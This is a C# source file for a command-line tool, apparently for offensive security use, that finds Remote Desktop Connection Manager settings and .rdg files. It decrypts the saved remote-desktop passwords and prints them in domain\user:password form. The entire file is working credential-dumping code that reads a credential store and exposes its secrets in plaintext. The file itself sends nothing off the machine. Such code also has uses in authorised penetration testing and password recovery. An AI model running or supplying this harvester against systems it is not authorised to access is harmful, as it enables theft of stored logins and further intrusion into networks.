using System;
using System.Collections.Generic;
using System.IO;
using System.Xml;

// Reference 1: https://github.com/nettitude/PoshC2/blob/master/resources/modules/Decrypt-RDCMan.ps1
// Reference 2: https://smsagent.blog/2017/01/26/decrypting-remote-desktop-connection-manager-passwords-with-powershell/

namespace DecryptRDCManager
{
    public class Program
    {
        public static void Main(string[] args)
        {
            String pathToFile = "";

            if (args.Length == 1)
            {
                if (args[0] == "-h" || args[0] == "--help")
                {
                    Console.WriteLine("./DecryptRDCManager.exe [path to .rdg]");
                    return;
                }
                pathToFile = args[0];
            }

            List<String> RDGFiles = new List<String>();

            if (pathToFile == "")
            {
                XmlDocument RDCManSettings = new XmlDocument();
                pathToFile = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Microsoft\Remote Desktop Connection Manager\RDCMan.settings";
                Logger.Print(Logger.STATUS.INFO, "Checking settings for .rdg files: " + pathToFile);

                try
                {
                    RDCManSettings.LoadXml(File.ReadAllText(pathToFile));
                }
                catch (Exception e)
                {
                    Logger.Print(Logger.STATUS.ERROR, e.Message);
                    return;
                }

                XmlNodeList nodes = RDCManSettings.SelectNodes("//FilesToOpen");
                if (nodes.Count == 0)
                {
                    Logger.Print(Logger.STATUS.ERROR, "Found 0 .rdg files...");
                    return;
                }
                else
                {
                    Logger.Print(Logger.STATUS.GOOD, "Found " + nodes.Count + " .rdg file(s)!");
                }

                foreach (XmlNode node in nodes)
                {
                    String RDGFilePath = node.InnerText;
                    if (!RDGFiles.Contains(RDGFilePath))
                    {
                        RDGFiles.Add(RDGFilePath);
                    }
                }
            }
            else
            {
                Logger.Print(Logger.STATUS.INFO, "Using file: " + pathToFile);
                RDGFiles.Add(pathToFile);
            }

            Console.WriteLine();
            Console.WriteLine("Credentials:");

            foreach (String RDGFile in RDGFiles)
            {
                ParseRDGFile(RDGFile);
            }
        }
        private static void ParseRDGFile(String RDGPath)
        {
            Logger.Print(Logger.STATUS.INFO, "Checking: " + RDGPath);
            XmlDocument RDGFileConfig = new XmlDocument();
            List<String> credLocations = new List<String> { "credentialsProfiles", "logonCredentials" };

            foreach (String credLocation in credLocations)
            {
                try
                {
                    RDGFileConfig.LoadXml(File.ReadAllText(RDGPath));
                }
                catch (Exception e)
                {
                    Logger.Print(Logger.STATUS.ERROR, e.Message);
                    return;
                }
                XmlNodeList nodes = RDGFileConfig.SelectNodes("//" + credLocation);

                foreach (XmlNode node in nodes)
                {
                    String password = "";
                    String userName = "";
                    String domain = "";
                    String profileName = "";

                    foreach (XmlNode subnode in node)
                    {
                        try
                        {
                            if (subnode["userName"].InnerText.Contains("\\"))
                            {
                                domain = subnode["userName"].InnerText.Split('\\')[0];
                                userName = subnode["userName"].InnerText.Split('\\')[1];
                            }
                            else
                            {
                                userName = subnode["userName"].InnerText;
                            }
                            domain = subnode["domain"].InnerText;
                            password = subnode["password"].InnerText;
                            profileName = subnode["profileName"].InnerText;
                        }
                        catch (Exception e)
                        {
                            continue;
                        }
                    }

                    if (password != "")
                    {
                        String decrypted = DecryptPassword(password);
                        if (decrypted == "")
                        {
                            Logger.Print(Logger.STATUS.ERROR, "Failed to decrypt password for: " + userName + "\\" + password);
                        }
                        else
                        {
                            Logger.Print(Logger.STATUS.GOOD, String.Format("{0}\\{1}:{2} ({3})", domain, userName, decrypted, profileName));
                        }
                    }
                }
            }
        }
        private static String DecryptPassword(String password)
        {
            String decrypted = "";
            try
            {
                decrypted = RdcMan.Encryption.DecryptString(password, new RdcMan.EncryptionSettings());
                return decrypted;
            }
            catch (Exception e)
            {
                Logger.Print(Logger.STATUS.ERROR, e.Message);
                return "";
            }
        }
    }
}
